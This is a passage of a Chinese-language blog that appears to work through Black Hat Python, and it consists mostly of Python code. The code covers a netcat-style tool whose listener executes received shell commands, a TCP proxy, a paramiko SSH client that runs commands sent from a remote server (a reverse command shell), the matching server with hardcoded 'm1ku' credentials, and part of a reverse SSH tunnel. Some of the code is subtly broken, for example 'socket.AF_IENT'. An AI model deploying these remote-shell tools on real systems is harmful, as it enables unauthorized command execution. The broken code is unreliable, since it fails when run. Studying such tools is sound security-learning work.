class="string">&quot;Examples: &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -t 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -t 5555 -l -u /home/miku/text.txt&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;ABCDEFGHI&#x27; | ./bhpnet.py -t 192.168.11.12 -p 135&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> command </span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">global</span> uploadDestination</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]): <span class="comment"># 如果没输入参数，则显示使用说明</span></span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opts, args = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hlt:p:cu:&quot;</span>, [<span class="string">&#x27;help&#x27;</span>, <span class="string">&#x27;listen&#x27;</span>, <span class="string">&#x27;execute=&#x27;</span>, <span class="string">&#x27;target=&#x27;</span>, <span class="string">&#x27;port=&#x27;</span>, <span class="string">&#x27;command&#x27;</span>, <span class="string">&#x27;upload=&#x27;</span>])</span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析命令行选项</span></span><br><span class="line">    <span class="keyword">for</span> o, v <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;--help&#x27;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>):</span><br><span class="line">            listen = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>):</span><br><span class="line">            target = v</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>):</span><br><span class="line">            port = <span class="built_in">int</span>(v)</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--command&#x27;</span>):</span><br><span class="line">            command = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;--upload&#x27;</span>):</span><br><span class="line">            uploadDestination = v</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Unhandled Option&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt; <span class="number">0</span>: <span class="comment"># 没在监听，有目标地址，有端口号 -&gt; 发送数据</span></span><br><span class="line">        client_sender() <span class="comment"># 发送数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_sender</span>():</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        client.connect((target, port))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buff = <span class="built_in">input</span>(<span class="string">&quot;BHP tool #: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span> == buff:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            client.send(buff.encode())</span><br><span class="line">            data = client.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Exception! Exiting. &quot;</span> + <span class="built_in">str</span>(err))</span><br><span class="line"></span><br><span class="line">    client.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>():</span></span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">        target = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line"></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.bind((target, port))</span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line">        client_thread = threading.Thread(target=client_handler, args=(client_socket,))</span><br><span class="line">        client_thread.start()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span>(<span class="params">command</span>):</span></span><br><span class="line">    command = command.rstrip()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        output = subprocess.check_output(command, stderr = subprocess.STDOUT, shell = <span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        output = <span class="string">&quot;Failed to execute command.\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span>(<span class="params">client_socket</span>):</span></span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> uploadDestination</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(uploadDestination):</span><br><span class="line">        data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(uploadDestination, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(data + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">&quot;Successfully saved.&quot;</span>.encode())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">&quot;Failed to save.&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果需要反弹一个shell，需要进入另一个循环</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd_buff = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            resp = run_command(cmd_buff.decode())</span><br><span class="line">            client_socket.send(resp)</span><br><span class="line"></span><br><span class="line">    client_socket.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="tcp代理-1">9.2. TCP代理</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>(<span class="params">local_host, local_port, remote_host, remote_port, receive_first</span>):</span></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host, local_port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!!] Failed to listen on %s:%d&quot;</span> % (local_host, local_port))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (local_host, local_port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received incoming connection from %s:%d&quot;</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">        proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket,remote_host, remote_port, receive_first))</span><br><span class="line">        proxy_thread.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]) != <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: ./proxy.py [local_host] [local_port] [remote_host] [remote_port] [receive_first]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    local_host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    remote_host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port = <span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    receive_first = sys.argv[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;1&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    server_loop(local_host, local_port, remote_host, remote_port, receive_first)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span>(<span class="params">local, remote_host, remote_port, receive_first</span>):</span></span><br><span class="line">    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    remote.connect((remote_host, remote_port))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer = receive_from(remote) <span class="comment"># receive from remote process</span></span><br><span class="line">        remote_buffer = response_handler(remote_buffer) <span class="comment"># modifiy the response from remote to local</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sending %d bytes to local.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line">            local.send(remote_buffer.encode()) <span class="comment"># send to local process</span></span><br><span class="line">            remote_buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        local_buffer = receive_from(local)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received %d bytes from local.&quot;</span> % <span class="built_in">len</span>(local_buffer))</span><br><span class="line"></span><br><span class="line">            local_buffer = request_handler(local_buffer) <span class="comment"># modifiy the request from local to remote</span></span><br><span class="line">            remote.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Sent to remote.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        remote_buffer = receive_from(remote)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Received %d bytes from remote.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line"></span><br><span class="line">            remote_buffer = response_handler(remote_buffer)</span><br><span class="line">            local.send(remote_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sent to local.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> local_buffer == <span class="string">b&#x27;\n&#x27;</span>  <span class="keyword">and</span> remote_buffer == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line">            local.close()</span><br><span class="line">            remote.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] No more data. Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span>(<span class="params">conn</span>):</span></span><br><span class="line">    data = conn.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line">    <span class="keyword">return</span> data <span class="comment"># return bytes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># modifiy data</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># modifiy data</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="paramiko实现ssh">9.3. paramiko实现SSH</h2>
<h3 id="普通客户端">9.3.1. 普通客户端</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, user, passwd, command</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client.load_host_keys(&#x27;/home/m1ku/.ssh/known_hosts&#x27;)</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, username=user, password=passwd)</span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.exec_command(command)</span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    user = sys.argv[<span class="number">2</span>]</span><br><span class="line">    passwd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    command = sys.argv[<span class="number">4</span>]</span><br><span class="line">    ssh_command(ip, user, passwd, command)</span><br></pre></td></tr></table></figure>
<h3 id="客户端执行服务器命令并返回结果">9.3.2.
客户端（执行服务器命令并返回结果）</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko, shlex, subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, port, user, passwd, cmd</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, port=port, username=user, password=passwd)</span><br><span class="line"></span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(cmd)</span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>).decode())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = ssh_session.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd = cmd.decode()</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                    client.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                cmd_output = subprocess.check_output(shlex.split(cmd), shell=<span class="literal">True</span>)</span><br><span class="line">                ssh_session.send(cmd_output <span class="keyword">or</span> <span class="string">&#x27;okay&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                ssh_session.send(<span class="built_in">str</span>(e))</span><br><span class="line">        client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user = <span class="built_in">input</span>(<span class="string">&#x27;Enter username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Enter password: &#x27;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;Enter server IP: &#x27;</span>)</span><br><span class="line">    port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter port: &#x27;</span>))</span><br><span class="line">    ssh_command(ip, port, user, password, <span class="string">&#x27;ClientConnected&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="服务器给客户端发送命令并得到结果">9.3.3.
服务器（给客户端发送命令并得到结果）</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, paramiko, socket, sys, threading</span><br><span class="line">CWD = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">HOSTKEY = paramiko.RSAKey(filename = os.path.join(CWD, <span class="string">&#x27;test_rsa.key&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params">paramiko.ServerInterface</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span>(<span class="params">slef, kind, chanid</span>):</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">&#x27;session&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span>(<span class="params">self, username, password</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">&#x27;m1ku&#x27;</span>) <span class="keyword">and</span> (password == <span class="string">&#x27;m1ku&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = <span class="string">&#x27;10.0.2.21&#x27;</span></span><br><span class="line">    port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock = socket.socket(socket.AF_IENT, socket.SOCK_STREAM)</span><br><span class="line">        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        sock.bind((server, port))</span><br><span class="line">        sock.listen(<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Listening for connection...&#x27;</span>)</span><br><span class="line">        client, addr = sock.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Listen failed: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># the follow codes will be excute if try no problem</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Got a connection!&#x27;</span>, client, addr)</span><br><span class="line"></span><br><span class="line">    bhSession = paramiko.Transport(client) <span class="comment"># An SSH Transport attaches to a stream (usually a socket)</span></span><br><span class="line">    bhSession.add_server_key(HOSTKEY)</span><br><span class="line">    server = Server()</span><br><span class="line">    bhSession.start_server(server=server)</span><br><span class="line">    </span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*** No chcannel!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Authenticated!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(chan.recv(<span class="number">1024</span>))</span><br><span class="line">    chan.send(<span class="string">&#x27;Welcome to bh_ssh&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                r = chan.recv(<span class="number">8192</span>)</span><br><span class="line">                <span class="built_in">print</span>(r.decode())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;exiting&#x27;</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        bhSession.close()</span><br></pre></td></tr></table></figure>
<h2 id="ssh隧道-1">9.4. SSH隧道</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> select</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">SSH_PORT = <span class="number">22</span></span><br><span class="line">DEFAULT_PORT = <span class="number">4000</span></span><br><span class="line">g_verbose = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">HELP = <span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">Set up a reverse forwarding tunnel across an SSH server, using paramiko. A</span></span><br><span class="line"><span class="string">port on the SSH server (given with -p) is forwarded across an SSH session</span></span><br><span class="line"><span class="string">back to the local machine, and out to a remote site reachable from this</span></span><br><span class="line"><span class="string">network. This is similar to the openssh -R option.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_host_port</span>(<span class="params">spec, default_port</span>):</span></span><br><span class="line">    <span class="string">&quot;Parse &#x27;hostname:22&#x27; into a host and port, with the port optional.&quot;</span></span><br><span class="line">    args = (spec.split(<span class="string">&quot;:&quot;</span>, <span class="number">1</span>) + [default_port])[:<span class="number">2</span>]</span><br><span class="line">    args[<span class="number">1</span>] = <span class="built_in">int</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> args[<span class="number">0</span>], args[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_options</span>():</span></span><br><span class="line">    <span class="keyword">global</span> g_verbose</span><br><span class="line"></span><br><span class="line">    usage = <span class="string">&quot;usage: %prog [options] &lt;ssh-server&gt;[:&lt;server-port&gt;]&quot;</span> <span class="comment">#The usage summary to print when your program is run incorrectly or with a help option.</span></span><br><span class="line">    version = <span class="string">&quot;%prog 1.0&quot;</span> <span class="comment"># A version string to print when the user supplies a version option.</span></span><br><span class="line">    parser = OptionParser(usage=usage, version=version, description=HELP) <span class="comment"># create a instance</span></span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-q&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--quiet&quot;</span>,</span><br><span class="line">        action = <span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">        default = <span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span> = <span class="string">&quot;squelch all informational output.&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-p&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--remote-port&quot;</span>,</span><br><span class="line">        action = <span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span> = <span class="string">&quot;int&quot;</span>,</span><br><span class="line">        dest = <span class="string">&quot;port&quot;</span>,</span><br><span class="line">        default = DEFAULT_PORT,</span><br><span class="line">        <span class="built_in">help</span> = <span class="string">&quot;port on server to forward (defalut: %d)&quot;</span> % DEFAULT_PORT</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-u&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--user&quot;</span>,</span><br><span class="line">        action = <span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span> = <span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest = <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">        default = getpass.getuser(),</span><br><span class="line">        <span class="built_in">help</span> = <span class="string">&#x27;username for SSH authentication (default: %s)&#x27;</span> % getpass.getuser()</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-K&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--key&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;keyfile&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;private key file to use for SSH authentication&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--no-key&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;look_for_keys&quot;</span>,</span><br><span class="line">        default=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;don&#x27;t look for or use a private key file&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-P&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--password&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store_true&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;readpass&quot;</span>,</span><br><span class="line">        default=<span class="literal">False</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;read password (for key or password auth) from stdin&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    parser.add_option(</span><br><span class="line">        <span class="string">&quot;-r&quot;</span>,</span><br><span class="line">        <span class="string">&quot;--remote&quot;</span>,</span><br><span class="line">        action=<span class="string">&quot;store&quot;</span>,</span><br><span class="line">        <span class="built_in">type</span>=<span class="string">&quot;string&quot;</span>,</span><br><span class="line">        dest=<span class="string">&quot;remote&quot;</span>,</span><br><span class="line">        default=<span class="literal">None</span>,</span><br><span class="line">        metavar=<span class="string">&quot;host:port&quot;</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;remote host and port to forward to&quot;</span>,</span><br><span class="line">    )</span><br><span class="line">    options, args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;Incorrect number of arguments.&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> options.remote <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        parser.error(<span class="string">&quot;Remote address required (-r).&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># g_verbose = options.verbose</span></span><br><span class="line">    server_host, server_port = get_host_port(args[<span class="number">0</span>], SSH_PORT)</span><br><span class="line">    remote_host, remote_port = get_host_port(options.remote, SSH_PORT)</span><br><span class="line">    <span class="keyword">return</span> options, (server_host, server_port), (remote_host, remote_port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verbose</span>(<span 